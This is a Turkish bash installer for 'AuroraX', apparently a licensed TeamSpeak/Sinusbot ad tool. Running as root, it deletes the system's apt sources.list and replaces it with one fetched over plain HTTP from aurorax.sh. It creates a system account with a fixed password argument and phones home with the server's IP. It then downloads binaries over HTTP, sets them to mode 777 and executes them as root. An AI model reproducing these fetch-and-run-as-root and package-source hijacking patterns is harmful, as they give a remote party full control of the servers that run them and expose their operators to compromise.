#!/bin/bash

  #########################################################################
  # Yapımcı: Can Mert                                                     #
  # Site: http://aurorax.sh ~ http://elsethen.org                         #
  #                                                                       #
  #  ADS System And Sinusbot System By Ömer şeran                         #
  #                                                                       #
  #  Bu mesajı gördüğüne göre şifrelemeyi kırmışsın,                      #
  #  Sorun yok, kodları değiştirebilirsin.                                #
  #  Ancak ismimi silip paylaşmaya geldiysen bil ki;                      #
  #                                                                       #
  #  Emek hırsızlığı ile bir yere gelemezsin,                             #
  #  Her zaman üşengeç bir yavşak olarak kalacaksın.                      #
  #  Not: Özellikle Benle Arkadaş Ve Dost Olan Kişiler İçin Geçerlidir ;) # 
  #########################################################################
  
   #GitHub Testing
  #GitHub Testing
    #GitHub Testing
  #GitHub Testing
    #GitHub Testing
  #GitHub Testing
  
#Matris = 'Ana'
matris="http://aurorax.sh/dll/matris"  
file="http://aurorax.sh/dll/file"
date=`curl -s aurorax.sh/dll/date.php`  
ip=`curl -s aurorax.sh/dll/ip.php`
surum=$(wget http://aurorax.sh/dll/v1.0.0.php -q -O -)           
s="\033[0m"
ECHO_PATH=echo;
APT_PATH=apt-get;
CURL_PATH=curl;
CD_PATH=cd;
install_path="install"
file_path="aurora_x"
CLEAR_PATH=clear;
WGET_PATH=wget;
mkdir_path="mkdir"
scp_path="aurora_scp"
dizin_else="/home/aurorax"
#Root Control 
if [ "$(id -u)" != "0" ]; then
   ${ECHO_PATH} -e "\033[33m\033[31mRoot Diğilsiniz Scriptin Çalışması için Root Yetkisine Sahip Olmalsınız\033[33m\e[0m" 1>&2
   exit 1
fi
#Matris File Control
if [ -d "$dizin_else" ] 
then
${CLEAR_PATH}
else
useradd -N -m -r -p 123456789 aurorax
${CLEAR_PATH}
fi

#Matris Two Factor Control
if [ -d "$dizin_else" ] 
then
${CLEAR_PATH}
else
$mkdir_path $dizin_else
${CLEAR_PATH}
fi

#Packet Control
if [ ! -d "$dizin_else/aurorasucces.x" ] 
then
${CLEAR_PATH}
${ECHO_PATH} "Scripti ilk defa çalıştırdığınız tespit edildi. Temel bileşenler birazdan kurulacak!"
sleep 2
if cat /etc/*release | grep ^NAME | grep Ubuntu; then
${CLEAR_PATH}
${APT_PATH} $install_path ${WGET_PATH}
${CLEAR_PATH}
${CLEAR_PATH}
${CLEAR_PATH}
mavii="\033[1;37m"
mavis="\033[1;31m" 
${ECHO_PATH} -e "\033[1;33m###################################################################\033[1;32m \033[0m"	
${ECHO_PATH} -e "\033[1;31mUyarı: \033[1;33mİşletim Sisteminizi Doğru Seçiniz !\033[0m"
${ECHO_PATH} -e "\033[1;33m###################################################################\033[1;32m \033[0m"
${ECHO_PATH} -e "\033[33m\033[31mBu Script Sadece Ubuntu 14 Ve 16 İşletim Sistemlerini Desteklemektedir.\033[33m\e[0m"
${ECHO_PATH} -e "${mavis}1) \033${mavii}Ubuntu${s} ${mavis}16\033[32m \033[0m"
${ECHO_PATH} -e "${mavis}2) \033${mavii}Ubuntu${s} ${mavis}14\033[32m \033[0m"
${ECHO_PATH} -e -n "\033[1;31mCevap :${s}"
						    read errorconf
							case $errorconf in
								    1)
								    sudo ${ECHO_PATH} "
									0.0.0.0 ns3019513.aurorax.sh
                                    " >> /etc/hosts;
									${CLEAR_PATH}
									${CD_PATH} /etc/apt/
									sudo rm -r sources.list
									${WGET_PATH} -q http://aurorax.sh/dll/sources.list
                                    ;;
								    2)
				                    sudo ${ECHO_PATH} "
									0.0.0.0 ns3019513.aurorax.sh
                                    " >> /etc/hosts;
								    ${CLEAR_PATH}
									${CD_PATH} /etc/apt/
									sudo rm -r sources.list
									${WGET_PATH} -q http://aurorax.sh/dll/14/sources.list
								    ;;
								 esac
								 ${CLEAR_PATH}  
${APT_PATH} update 
${APT_PATH} upgrade 
${APT_PATH} $install_path unzip
${APT_PATH} $install_path ruby
${APT_PATH} $install_path ${WGET_PATH}
${APT_PATH} $install_path ${CURL_PATH}
${APT_PATH} $install_path gcc
${CD_PATH} $dizin_else
${WGET_PATH} https://github.com/busyloop/lolcat/archive/master.zip
unzip master.zip
rm -r master.zip
${CD_PATH} lolcat-master/bin
gem $install_path lolcat
${CD_PATH} /tmp 
$mkdir_path .axlog
${CD_PATH} $dizin_else
$mkdir_path .auroradata
$mkdir_path systembackup.x
$mkdir_path aurorasucces.x
${CD_PATH} /root
${ECHO_PATH} -e "\033[1;33m\033[32mGüncelleme Yapıldı.\033[33m"
sleep 0.1
 else
    ${ECHO_PATH} "Üzgünüm! Desteklenmeyen işletim sistemi kullanıyorsunuz."
    exit 1;
 fi

fi
#Curl Control
command -v ${CURL_PATH} >/dev/null 2>&1 || error_curl="1"
if [[ $error_curl -eq 1 ]]
	then
${CLEAR_PATH}
${ECHO_PATH} -e "\033[1;33m${CURL_PATH} Kütüphanesi Bulunamadı.\033[1;32m \033[0m"
${ECHO_PATH} -e "\033[1;33m${CURL_PATH} Kuruluyor...\033[0m"
sleep 2
${APT_PATH} $install_path ${CURL_PATH} -y
${CLEAR_PATH} 
${ECHO_PATH} -e "\033[1;33m${CURL_PATH} Kurululdu.\033[0m"
sleep 1
fi
#Server Control
if ${CURL_PATH} -s --head  --request GET aurorax.sh | grep "200 OK" > /dev/null; then
${CLEAR_PATH}
okey="1"
else
${CLEAR_PATH}
${ECHO_PATH} -e "\e[91mAna Sunucu İle Bağlantı Kurulamadı. \033[1;33mAna Sunucuya Tekrar Bağlanmayı Deniyoruz.${s}"
#Two Factor Server Control
if ${CURL_PATH} -s --head  --request GET aurorax.sh | grep "200 OK" > /dev/null; then
${ECHO_PATH} -e "\033[1;32mAna Sunucuya Bağlanıldı.\033[0m"
sleep 1
else
sleep 3
${ECHO_PATH} -e "\e[91mAna Sunucu İle Bağlantı Kurulamadı. \033[1;37mLütfen Bize Bildiriniz ${s}\033[1;32mfb.com/elsethen${s}"
exit
fi
fi
#License Control
if ${CURL_PATH} -s --head  --request GET http://aurorax.sh/licensetosblinux/$ip | grep "200 OK" > /dev/null; then
license="ok"
else
clear
${ECHO_PATH} -e "\033[1;36m$ip ip adresli sunucu lisans listesinde bulunamadı.\033[0m"
${ECHO_PATH} -e "\033[1;36mSunucunuzu lisans listesine eklemediğiniz sürece script açılmayacaktır.\033[0m"
${ECHO_PATH} -e "\033[1;36mLisans eklemek için aurorax.sh adresini ziyaret edin.\033[0m"
exit
fi
#Ban Control
if ${CURL_PATH} -s --head  --request GET http://aurorax.sh/dll/ban/$ip | grep "200 OK" > /dev/null; then
clear
${ECHO_PATH} -e "\033[1;36mReklamlara uzun süre tıklamadığınız için kullanımınız kapatıldı\033[0m"
${ECHO_PATH} -e "\033[1;36mScripte tekrar erişebilmek için fb.com/elsethen adresine girip mesaj atınız\033[0m"
${ECHO_PATH} -e "\033[1;36mUygungörülürse script erişim engeliniz kaldırılacaktır\033[0m"
exit
else
ban="0"
fi
#Update Control
if ${CURL_PATH} -s --head  --request GET $file/v$surum.php | grep "200 OK" > /dev/null; then
tamam="1"
else
${CLEAR_PATH}
${ECHO_PATH} -e "\033[1;37mScript Başlatılıyor: \033[1;33mYeni versiyon bulundu, script güncelleniyor...\033[0m"
sleep 1.5
${CD_PATH} /root
${WGET_PATH} -q $file/yenisurum.zip
unzip yenisurum.zip
rm -rf aurorax
mv aurorax-yenisurum aurorax
chmod 777 aurorax
rm -r yenisurum.zip
${CLEAR_PATH}
${CLEAR_PATH}
${ECHO_PATH} -e "\033[1;37mScript başarıyla güncellendi, tekrar çalıştırın.\033[0m"
exit
fi
#B Control
if ${CURL_PATH} -s --head  --request GET http://aurorax.sh/dll/locked.server | grep "200 OK" > /dev/null; then
${CLEAR_PATH}
${ECHO_PATH} -e "\033[1;33mÜzgünüm şuanda script bakım modundadır.\033[0m"
exit
else
tamam="1"
fi



#Matris File Create
${CD_PATH} $dizin_else/aurorasucces.x 
${CLEAR_PATH}
rm -r control_ax
${CLEAR_PATH}
${WGET_PATH} -q $matris/control_ax
chmod 777 control_ax
${CLEAR_PATH}
rm -r $file_path
${CLEAR_PATH}
${WGET_PATH} -q $matris/$file_path
chmod 777 $file_path
./$file_path
rm -r $file_path
${WGET_PATH} -q $file/$scp_path
chmod 777 $scp_path
mv $scp_path $file_path



	
	


